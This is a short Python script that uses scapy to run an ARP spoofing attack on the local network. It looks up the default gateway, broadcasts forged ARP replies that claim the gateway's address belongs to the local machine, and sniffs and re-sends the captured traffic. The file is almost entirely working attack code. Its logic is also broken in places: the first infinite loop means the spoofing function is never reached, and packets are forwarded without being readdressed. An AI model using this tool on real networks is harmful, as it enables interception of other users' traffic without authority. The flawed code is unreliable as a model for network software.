import netifaces
from scapy.all import ARP, Ether, sendp
from scapy.layers.inet import IP, TCP
from scapy.all import sniff


def get_local_gateway():
    gateways = netifaces.gateways()
    default_gateway = gateways['default'][netifaces.AF_INET][0]
    return default_gateway

def get_local_mac(interface):
    try:
        mac_address = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
        return mac_address
    except:
        print("Unable to get the MAC address of the specified interface.")
        return None

def send_arp_packet(gateway_ip, local_mac, interface):
    arp_reply = ARP(pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=local_mac)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = ether / arp_reply

    print("Sending ARP packets continuously...")

    while True:
        sendp(arp_packet, iface=interface, verbose=False)

def forward_packet(packet):
    # Forward packet to its original destination
    sendp(packet, verbose=False)

def arp_spoof(interface, gateway_ip, local_mac):
    arp_reply = ARP(pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=local_mac)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = ether / arp_reply

    print("Starting ARP spoofing attack...")

    while True:
        sendp(arp_packet, iface=interface, verbose=False)
        sniff(iface=interface, prn=forward_packet)

def main():
    gateway_ip = get_local_gateway()
    print("Default gateway of the local network:", gateway_ip)

    interface = input("Enter the name of the network interface (e.g., eth0): ")
    local_mac = get_local_mac(interface)
    if local_mac is None:
        return

    send_arp_packet(gateway_ip, local_mac, interface)

    arp_spoof(interface, gateway_ip, local_mac)

if __name__ == "__main__":
    main()
